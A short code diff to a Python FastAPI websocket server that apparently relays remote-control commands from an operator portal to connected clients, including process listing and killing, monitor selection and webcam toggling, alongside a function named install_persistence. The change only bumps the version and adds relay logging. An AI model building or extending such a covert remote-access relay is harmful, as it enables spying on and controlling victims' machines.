@@ -11,7 +11,7 @@ from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Response, Request
 from fastapi.staticfiles import StaticFiles
 import uvicorn
 from fastapi.responses import HTMLResponse, Response
-AGENT_VERSION = "9.3.2-TRACE"
+AGENT_VERSION = "9.3.3-RELAY"
 app = FastAPI()
 
 def install_persistence():
@@ -194,7 +194,11 @@ async def websocket_endpoint(websocket: WebSocket):
                             await websocket.send_text(orjson.dumps({"t": "rtc_ice", "candidate": cand}).decode())
                 elif event["t"] in ("rtc_offer", "rtc_ice", "get_processes", "kill_process", "select_monitor", "toggle_webcam", "set_quality", "set_fps"):
                     target = PORTAL_TO_CLIENT.get(websocket)
-                    if target: await manager.send_to_client(target, event)
+                    if target:
+                        print(f"[RELAY] Portal -> Client ({target}): {event['t']}")
+                        await manager.send_to_client(target, event)
+                    else:
+                        print(f"[REJECT] Portal tried to send {event['t']} but no target linked!")
             else:
                 raw = await websocket.receive()
                 if "text" in raw:
